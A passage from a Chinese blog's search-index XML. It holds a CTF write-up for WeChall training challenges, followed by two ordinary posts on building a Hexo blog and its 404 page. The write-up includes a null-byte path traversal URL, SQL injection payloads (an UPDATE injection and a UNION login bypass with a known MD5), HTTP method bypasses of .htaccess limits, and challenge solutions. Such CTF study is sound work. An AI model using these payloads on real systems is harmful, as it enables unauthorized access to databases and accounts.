<p><a href="http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00" target="_blank" rel="external">http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00</a></p>
</blockquote>
<h1 id="Training-Encodings-I"><a href="#Training-Encodings-I" class="headerlink" title="Training: Encodings I"></a>Training: Encodings I</h1><p>本来按照正常思路是先8个8个一组，分到最后发现不对，不是8的倍数。然后百度，原来重点是提示的：<code>English</code>。</p>
<p><strong>英文字母所用的ascii字符只占用七个bit（即7位）</strong></p>
<p>脚本如下：</p>
<pre><code>str1=&quot;101010011010001101001111001101000001110100110010111110001110100010000011010011110011010000001101110101101110001011010011110100010000011001011101110110001111011111100100110010111001000100000110000111100111100011110100111010010101110010000010110011101111111010111100100100000111000011000011110011111001111101111101111111001011001000100000110100111100110100000110010111000011110011111100111100111110100110000111100101110100110010111100100101110&quot;

print len(str1)

def res(str1):

    length = len(str1)

    for i in range(length/7):

        yield str1[i*7:(i+1)*7]
s=&quot;&quot;

for r in res(str1):

    s += chr(int(r,2)) //将二进制的字符串变成整形的十进制

print s
</code></pre><ul>
<li>yield关键字用来定义生成器（Generator），其具体功能是可以当return使用，从函数里返回一个值，不同之处是用yield返回之后，可以让函数从上回yield返回的地点继续执行。也就是说，yield返回函数，交给调用者一个返回值，然后再“瞬移”回去，让函数继续运行， 直到吓一跳yield语句再返回一个新的值。</li>
<li><code>int(r,2)</code>2是表示转化为十进制，默认的是0<blockquote>
<p>This text is 7-bit encoded ascii. Your password is easystarter.</p>
</blockquote>
</li>
</ul>
<h1 id="Training-Crypto-Transposition-I"><a href="#Training-Crypto-Transposition-I" class="headerlink" title="Training: Crypto - Transposition I"></a>Training: Crypto - Transposition I</h1><p><strong>置换密码</strong>：就是明文的字母保持相同，但顺序被打乱了。</p>
<p>密文如下：</p>
<pre><code>oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wa nrrabflmag.b
</code></pre><p>脚本如下：</p>
<pre><code>s=&apos;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wa msmniaocam.d&apos;
for i in range(0,len(s),2):
    res=&apos;&apos;
    t= (s[i + 1] + s[i])
    res +=t
    print res
</code></pre><p><strong>说明：</strong>字符串的长度为148，所以可以换的话就有：</p>
<ul>
<li>两两互换即o，W互换，d，n互换…共74对</li>
<li>四四互换即oWdn，reuf互换，.lY ，uoc 互换…共37对</li>
<li>37,37互换…</li>
<li>74,74互换…<blockquote>
<p>Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: asmnmaicomad.</p>
</blockquote>
</li>
</ul>
<h1 id="Training-Register-Globals"><a href="#Training-Register-Globals" class="headerlink" title="Training: Register Globals"></a>Training: Register Globals</h1><p>PHP全局变量</p>
<p>源码如下：</p>
<pre><code>...
if (isset($login))
{
    echo GWF_HTML::message(&apos;Register Globals&apos;, $chall-&gt;lang(&apos;msg_welcome_back&apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
    if (strtolower($login[0]) === &apos;admin&apos;) {
        $chall-&gt;onChallengeSolved(GWF_Session::getUserID());
    }
...
</code></pre><p>代码中检测login，如果login[0]=’admin’输出信息。</p>
<p>构造代码如下：</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin" target="_blank" rel="external">http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin</a></p>
</blockquote>
<h1 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h1><p><strong>update注入</strong></p>
<p>如果一直点一个人的话，会一直增长，如果有人达到100，所有人重置。</p>
<p>执行以下代码：</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil" target="_blank" rel="external">http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil</a></p>
</blockquote>
<p>回显为：</p>
<blockquote>
<p>GDO Error(1054): Unknown column ‘bil’ in ‘field list’<br>UPDATE noescvotes SET <code>bil</code>=<code>bil</code>+1 WHERE id=1</p>
</blockquote>
<p>构造如下语句：</p>
<blockquote>
<p>bill`=111%23</p>
</blockquote>
<p>则sql语句为：</p>
<blockquote>
<p>UPDATE noescvotes SET <code>bill</code>=111%23<code>=</code>bill`+1 WHERE id=1</p>
</blockquote>
<p>构造URL：</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23" target="_blank" rel="external">http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23</a></p>
</blockquote>
<h1 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h1><p><strong>单表置换密码</strong></p>
<p>密文如下：</p>
<pre><code>DK OAM VTFXLAOK LIG KIQ PVE BMVG OAXH FK RBXMEG X VF XFZBMHHMG YMBK CMTT GIEM KIQB HITQOXIE UMK XH ZMFLMZXAFEXL OAXH TXOOTM PAVTTMELM CVH EIO OII AVBG CVH XO
</code></pre><p>密钥短语密码就是选一个英文短语作为密钥字(Key Word)或密钥短语(Key Phrase)，如HAPPY NEW YEAR，去掉重复字母得HAPYNEWR。将它依次写在明文字母表之下，而后再将字母表中未在短语中出现过的字母依次写于此短语之后，就可构造出一个字母代换表：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_zhihuan_1.png" alt=""></p>
<p>对照表就行了。</p>
<p><a href="http://quipqiup.com/index.php" target="_blank" rel="external">免费破解地址</a></p>
<pre><code>BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS PEMGEPIHMNIG THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT
</code></pre><h1 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h1><p>说了那么多屁话，就是一个等差数列。</p>
<p>第一分钟是2，以后依次加一，最后一项是17591026060781</p>
<p>所以总共有<br><code>(2+17591026060781)*17591026060781/2</code></p>
<p>发现结果竟然是小数，改为<code>(2+17591026060782)*17591026060782/2</code>竟然对了。。。</p>
<h1 id="Training-MySQL-II"><a href="#Training-MySQL-II" class="headerlink" title="Training: MySQL II"></a>Training: MySQL II</h1><p><strong>.htaccess</strong></p>
<p>username password分开来验证。通常的利用方法是使用union构造已知MD5值的查询。</p>
<p>构造语句：</p>
<pre><code>username=-1&apos; union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos; %23&amp;password=123456&amp;login=Login
</code></pre><p>这句话首先通过username=-1将原语句报错。因此返回的将会是第二条语句产生的信息。<br>而我们union select的是直接构造了用户名为admin，密码为123456的md5值。这样就可以让程序误认为我们构造的信息就是它从数据库里面提取得到的信息。<br><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_mysql_2.png" alt=""></p>
<h1 id="Limited-Access"><a href="#Limited-Access" class="headerlink" title="Limited Access"></a>Limited Access</h1><p>让我们访问<code>.htaccess</code></p>
<p>源码如下：</p>
<pre><code>AuthUserFile .htpasswd
AuthGroupFile /dev/null
AuthName &quot;Authorization Required for the Limited Access Challenge&quot;
AuthType Basic
&lt;Limit GET&gt;require valid-user
&lt;/Limit&gt;
</code></pre><p>源码中限制了<code>GET</code></p>
<p>所以使用post即可</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_access_1.png" alt=""></p>
<h1 id="Training-Regex"><a href="#Training-Regex" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p><strong>正则表达式</strong></p>
<p>匹配一个空字符就行了。</p>
<pre><code>正则表达式匹配空值方式如下：
\b 匹配单词开头或结尾位置
^ 匹配字符串开端位置
$ 匹配字符串结尾位置
\s 匹配一切空白字符
\n 匹配换行
</code></pre><p>代码如下：</p>
<blockquote>
<p>/^$/</p>
</blockquote>
<h1 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h1><pre><code>s = &apos;77 1F 1F 14 20 1A 1F 12 5C 20 29 1F 25 20 23 1F 1C 26 15 14 20 1F 1E 15 20 1D 1F 22 15 20 13 18 11 1C 1C 15 1E 17 15 20 19 1E 20 29 1F 25 22 20 1A 1F 25 22 1E 15 29 5E 20 04 18 19 23 20 1F 1E 15 20 27 11 23 20 16 11 19 22 1C 29 20 15 11 23 29 20 24 1F 20 13 22 11 13 1B 5E 20 07 11 23 1E 57 24 20 19 24 6F 20 61 62 68 20 1B 15 29 23 20 19 23 20 11 20 21 25 19 24 15 20 23 1D 11 1C 1C 20 1B 15 29 23 20 11 13 15 5C 20 23 1F 20 19 24 20 23 18 1F 25 1C 14 1E 57 24 20 18 11 26 15 20 24 11 1B 15 1E 20 29 1F 25 20 24 1F 1F 20 1C 1F 1E 17 20 24 1F 20 14 15 13 22 29 20 24 20 24 18 19 23 20 1D 15 23 23 11 17 15 5E 20 07 15 1C 1C 20 14 1F 1E 15 5C 20 29 1F 25 22 20 23 1F 1C 25 24 19 1F 1E 20 19 23 20 1D 20 23 11 22 22 15 23 20 1D 1E 17 5E&apos;
s = s.split()
for key in range(0,128+1,1):
    for i in s:
        i = int(i,16)
        print (chr((i + key + 256) % 256 ), end = &apos;&apos;)
    print (key)
</code></pre><p>key=80时</p>
<pre><code>Çoodpjob¬pyoupsolvedponepmorepchallengepinpyourpjourney®pThisponepwaspfairlypeasyptopcrack®pWasn§tpit¿p±²¸pkeyspispapquitepsmallpkeyspace¬psopitpshouldn§tphaveptakenpyouptooplongptopdecryptpthispmessage®pWellpdone¬pyourpsolutionpispmpsarrespmng®
</code></pre><h1 id="Stegano-Attachment"><a href="#Stegano-Attachment" class="headerlink" title="Stegano Attachment"></a>Stegano Attachment</h1><p>下载图片之后，notepad打开</p>
<p>发现：<code>solution.txt</code></p>
<p>改后缀为rar</p>
<blockquote>
<p>IDSRGRNENMPS</p>
</blockquote>
<h1 id="Training-LSB"><a href="#Training-LSB" class="headerlink" title="Training: LSB"></a>Training: LSB</h1><p>放入神器<code>stegsolve</code>中</p>
<blockquote>
<p>CBNMGNBFMOHN</p>
</blockquote>
<h1 id="Limited-Access-Too"><a href="#Limited-Access-Too" class="headerlink" title="Limited Access Too"></a>Limited Access Too</h1><p>访问.htaccess发现几乎过滤了所有方法</p>
<blockquote>
<p>GET POST HEAD PUT DELETE CONNECT OPTIONS</p>
</blockquote>
<ul>
<li>php会将TO方法给解析成GET方法。那么我们就可以抓包，改为TO</li>
<li>使用move方法</li>
</ul>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_access_2.png" alt=""></p>
<h1 id="PHP-0815"><a href="#PHP-0815" class="headerlink" title="PHP 0815"></a>PHP 0815</h1><p>源码如下：</p>
<pre><code>&lt;?
$whitelist = array(1, 2, 3);
if (false === ($show = isset($_GET[&apos;show&apos;]) ? $_GET[&apos;show&apos;] : false)) {
    die(&apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&apos;);
}
elseif (in_array($show, $whitelist)){
    $query = &quot;SELECT 1 FROM `table` WHERE `id`=$show&quot;;
    echo &apos;Query: &apos;.htmlspecialchars($query, ENT_QUOTES).&apos;&lt;br/&gt;&apos;;
    die(&apos;SHOWING NUMBER &apos;.htmlspecialchars($show, ENT_QUOTES));
}else 
{
        die(&apos;HACKER NONONO&apos;);
}
</code></pre><p>这明显是SQL注入，但是防注入的方法有很多，需要找到最简单的，于是找到一个方法：</p>
<p><strong>将传入的参数需要转换成整数。</strong></p>
<p>通常所用的函数是int()或者intval()</p>
<p>然而出于php wtf的atoi转换规则，$show-0足以完成</p>
<h1 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h1><p>这题是xss，借这个，再写一篇xss的总结。</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> WeChall </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[创建404页面]]></title>
      <url>/2015/10/13/%E5%88%9B%E5%BB%BA404%E9%A1%B5%E9%9D%A2/</url>
      <content type="html"><![CDATA[<h1 id="自定义页面"><a href="#自定义页面" class="headerlink" title="自定义页面"></a>自定义页面</h1><p>以404页面为例</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>执行命令</p>
<pre><code>$ hexo new page &quot;404&quot;
INFO  Created: D:\Hexo\Hexo\source\404\index-1.md
</code></pre><p>编写代码如下：</p>
<pre><code>title: 404 Not Found：该页无法显示
comments: false
permalink: /404
fancybox: false
---
&lt;style type=&quot;text/css&quot;&gt;
.article-title {
    font-size: 2.1em;
}
strong a {
    color: #747474;
}
.share {
    display: none;
}
.player {
    margin-left: -10px;
}
.sign {
    text-align: right;
    font-style: italic;
}
#page-visit {
    display: none;
}
.center {
    text-align: center;
    height: 2.5em;
    font-weight: bold;
}
.search2 {
    height: 2.2em;
    font-size: 1em;
    width: 50%;
    margin: auto 24%;
    color: #727272;
    opacity: .6;
    border: 2px solid lightgray;
}
.search2:hover {
    opacity: 1;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.3)
    };
.article-entry hr {
    margin: 0;
}
.pic {
    text-align: center;
    margin: 0;
}
.pic br {
    display: none;
}
&lt;/style&gt;

***

&lt;div class=&quot;pic&quot;&gt;
&lt;img src=&quot;/img/404.jpg&quot; title=&quot;Mihawk-Wind&quot;&gt;
&lt;/div&gt;

&lt;p class=&quot;center&quot;&gt;很抱歉，您所访问的地址并不存在: &lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/&quot;&gt;回主页&lt;/a&gt; · &lt;a href=&quot;/archives&quot;&gt;所有文章&lt;/a&gt; · &lt;a href=&quot;/about&quot;&gt;关于&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;可在边栏搜索框中对本站进行检索，以获取相关信息。&lt;/p&gt;

&lt;div style=&quot;text-align: center&quot;&gt;
以下是博主喜欢的一些歌曲，可以听听，稍作休息~
&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=320 height=330 src=&quot;http://music.163.com/outchain/player?type=0&amp;id=112513213&amp;auto=0&amp;height=430&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 编程 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Github+Hexo搭建独立博客]]></title>
      <url>/2015/09/13/%E4%BD%BF%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README”<br><a id="more"></a></p>
<h1 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h1><p>环境搭建：</p>
<ul>
<li>Node.js：<a href="https://nodejs.org/en/" target="_blank" rel="external">下载地址</a></li>
<li>Git：<a href="https://git-scm.com/download/win" target="_blank" rel="external">下载地址</a><br>#GitHub注册与配置</li>
<li><a href="http://github.com/" target="_blank" rel="external">注册地址</a></li>
<li>具体配置及使用请参照：<a href="http://beiyuu.com/github-pages" target="_blank" rel="external">使用Github Pages搭建独立博客</a></li>
<li>配置并添加SSH KEY到Github</li>
<li>测试</li>
</ul>
<p>可以输入下面的命令，看看设置是否成功，git@github.com的部分不要修改：</p>
<blockquote>
<p>$ ssh -T git@github.com</p>
</blockquote>
<p> 如果是下面的反馈：</p>
<blockquote>
<p>The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p>
</blockquote>
<p>不要紧张，输入yes就好，然后会看到：</p>
<blockquote>
<p>Hi cnfeat! You’ve successfully authenticated,<br>but GitHub does not provide shell access.</p>
<p>设置用户信息：<br>现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。</p>
</blockquote>
<p>Git会根据用户的名字和邮箱来记录提交。</p>
<blockquote>
<p>$ git config –global user.name “cnfeat”//用户名<br>$ git config –global user.email “cnfeat@gmail.com”//填写自己的邮箱</p>
</blockquote>
<p>SSH Key配置成功，本机已成功连接到github.</p>
<h1 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h1><p>Hexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>新建一个文档 当作博客根目录（尽量不要有中文），在此目录下打开Git Bash（前提确保Node.js已经安装，环境配置OK）</p>
<blockquote>
<p>$ npm install -g hexo</p>
<p>$ hexo init</p>
<p>$ hexo generate</p>
<p>$ hexo server</p>
</blockquote>
<p>打开本地<code>http://localhost:4000/</code>你就可以看到hexo网站了。</p>
<p><strong>注：</strong></p>
<ul>
<li><code>hexo server</code>启动之后无法访问：使用-p参数改端口</li>
<li><code>npm</code>命令找不到：使用npm.cmd,或者卸载重装</li>
<li><code>git</code>命令找不到：<code>git init</code>先初始化<h1 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h1>编辑hexo目录下的_config.yml（<strong>此文件为你网站的配置文件</strong>)</li>
</ul>
<p>修改代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">type: git</div><div class="line">repository: http://github.com/drops123456/drops123456.github.io.git</div><div class="line">		branch: master</div></pre></td></tr></table></figure></p>
<p>然后执行：</p>
<blockquote>
<p>hexo g 编译生成静态文件</p>
<p>hexo d 发布到Github</p>
</blockquote>
<p>访问：<code>http://username.github.io/</code>即可看到网站。</p>
<p>如果需要使用别的域名，在根目录下创建文件<code>CNAME</code>内容为你的域名即可（关于A记录和CNAME，请参考：<a href="http://blog.xieyc.com/differences-between-a-record-and-cname-record/" target="_blank" rel="external">域名解析的区别</a>）</p>
<h1 id="clone主题"><a href="#clone主题" class="headerlink" title="clone主题"></a>clone主题</h1><p>选择一个主题</p>
<ul>
<li><p>使用命令</p>
<blockquote>
<p>git clone <a href="http://example.com" target="_blank" rel="external">http://example.com</a></p>
</blockquote>
</li>
<li><p>下载zip包</p>
</li>
</ul>
<p>在把下载的主题拷贝到hexo/themes目录下，配置_config.yml</p>
<blockquote>
<p>theme: yelee</p>
</blockquote>
<h1 id="部署主题"><a href="#部署主题" class="headerlink" title="部署主题"></a>部署主题</h1><pre><code>$ hexo g #生成
$ hexo s #启动本地服务，进行文章预览调试
</code></pre><h1 id="实例example"><a href="#实例example" class="headerlink" title="实例example"></a>实例example</h1><p>以我的网站的配置，如下：</p>
<pre><code># Hexo Configuration
## Docs: https://hexo.io/docs/configuration.html
## Source: https://github.com/hexojs/hexo/

# Site
title: Joy_nick
subtitle: No pains, No gains！
description: No pains, No gains！
author: Joy_nick
language: zh-CN
timezone:

# URL
## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;
url: http://byd.dropsec.xyz
root: /
permalink: :year/:month/:day/:title/
permalink_defaults:

# Directory
source_dir: source
public_dir: public
tag_dir: tags
archive_dir: archives
category_dir: categories
code_dir: downloads/code
i18n_dir: :lang
skip_render:

# Writing
new_post_name: :title.md # File name of new posts
default_layout: post
titlecase: false # Transform title into titlecase
external_link: true # Open external links in new tab
filename_case: 0
render_drafts: false
post_asset_folder: false
relative_link: false
future: true
highlight:
  enable: true
  line_number: true
  auto_detect: false
  tab_replace:

# Category &amp; Tag
default_category: uncategorized
category_map:
tag_map:

# Date / Time format
## Hexo uses Moment.js to parse and display date
## You can customize the date format as defined in
## http://momentjs.com/docs/#/displaying/format/
date_format: YYYY-MM-DD
time_format: HH:mm:ss

# Pagination
## Set per_page to 0 to disable pagination
per_page: 8
pagination_dir: page

# Extensions
## Plugins: https://hexo.io/plugins/
## Themes: https://hexo.io/themes/
theme: yelee

feed:    #之后配置rss会用，使用如下配置即可
  type: atom
  path: atom.xml
  limit: 20 

# Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
  type: git
  repository: http://github.com/drops123456/drops123456.github.io.git
  branch: master
</code></pre><h1 id="发布新的文章"><a href="#发布新的文章" class="headerlink" title="发布新的文章"></a>发布新的文章</h1><ul>
<li><p>cd到网站根目录下</p>
<blockquote>
<p>$ hexo new “My New Post”</p>
<p>[info] File created at d:\Hexo\source_posts\My-New-Post.md</p>
</blockquote>
</li>
<li><p>编译生成静态文件</p>
<blockquote>
<p>hexo g</p>
</blockquote>
</li>
<li><p>部署到Github</p>
<blockquote>
<p>hexo d<br>也可以使用命令：<code>hexo g -d</code> </p>
</blockquote>
</li>
</ul>
<p><strong>注：建议每次部署前，先本地查看</strong></p>
<h1 id="命令总结"><a href="#命令总结" class="headerlink" title="命令总结"></a>命令总结</h1><pre><code>hexo n == hexo new
hexo g == hexo generate
hexo s == hexo server
hexo d == hexo deploy
hexo new &quot;postName&quot; #新建文章
hexo new page &quot;pageName&quot; #新建页面
hexo generate #生成静态页面至public目录
hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）
hexo deploy #将.deploy目录部署到GitHub
hexo help  # 查看帮助
hexo version  #查看Hexo的版本
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
